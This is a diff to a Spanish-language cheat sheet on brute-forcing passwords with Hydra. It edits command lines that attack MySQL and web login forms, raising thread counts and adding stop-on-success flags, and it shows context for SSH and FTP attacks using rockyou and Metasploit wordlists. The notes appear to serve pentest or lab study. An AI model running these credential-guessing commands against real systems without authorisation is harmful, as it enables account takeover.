@@ -32,7 +32,7 @@ cat rockyou_invertido.txt | tr -d ' ' > diccionario_sin_espacios.txt
 ```
 
 ```bash
-hydra -l <usuario> -P diccionario_sin_espacios.txt mysql://<IP_objetivo>
+hydra -l <usuario> -P diccionario_sin_espacios.txt <mysql>://<IP_objetivo> -t 20 -I
 ```
 
 ## Fuerza Bruta a Contraseñas (SSH y FTP)
@@ -60,8 +60,7 @@ hydra -L /usr/share/wordlists/metasploit/unix_users.txt -p <contraseña> ftp://<
 Primero se intercepta la peticion POST con BurpSuite para ver los parametros.
 
 ```bash
-hydra -l admin -P <diccionario> <IP> http-post-form \
-  "/ruta/login.php:usuario=admin&password=^PASS^:<texto_error>"
+hydra -l admin -P <diccionario> <IP> http-post-form "/ruta/login.php:usuario=admin&password=^PASS^:<texto_error>" -t 64 -F
 ```
 
 > `^PASS^` es donde Hydra inserta cada contraseña del diccionario.
